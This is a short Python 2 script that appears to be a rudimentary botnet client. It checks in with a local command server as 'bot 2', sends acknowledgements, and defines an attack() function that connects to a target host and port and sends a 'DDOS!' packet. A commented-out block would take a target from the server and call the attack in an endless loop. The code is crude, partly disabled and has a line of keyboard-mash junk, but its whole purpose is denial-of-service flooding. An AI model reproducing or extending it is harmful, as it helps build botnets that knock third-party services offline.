#!/usr/bin/python           # This is client.py file

import sys                  # Import sys module
import socket               # Import socket module

def attack(host="",port=80):
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    except socket.error,msg:
        print"Error:",msg
    else:
        try:
            host=socket.gethostbyname(host)
        except socket.gaierror:
            print"Unresolved hostname."
            sys.exit()
        else:
            packet = str('DDOS!').encode('utf-8')
            if sock.connect_ex((host,port)) == 0:
                if sock.sendall(packet) == None:
                    print"Packet sent successfully!"
                    sock.close()
                else:
                    print"Error while sending!"
                    sys.exit()

if __name__ == "__main__":

    s = socket.socket()         # Create a socket object
    server_host = socket.gethostname() # Get local machine name
    server_port = 22222                # Reserve a port for your service.
    s.connect((server_host, server_port))
    thanks = s.recv(1024)
    print thanks                # prints 'Thank you for connecting bot 2'
    #while True:
    #s.sendall('ACKACKACK')     # bot acknowledges
    s.sendall('ACKACKACK')      # bot acknowledges
    s.close()  #urhgiulerghersiugersuggrls#     
    """
    print 'Sent ACK'
    target_host = s.recv(1024)
    #s.sendall('ACK')
    #print target_host
    target_port = int(s.recv(1024))
    #s.sendall('ACK')
    print target_port
    s.close()                     # Close the socket when done testnew

    while True:
        attack(target_host, target_port)
    """
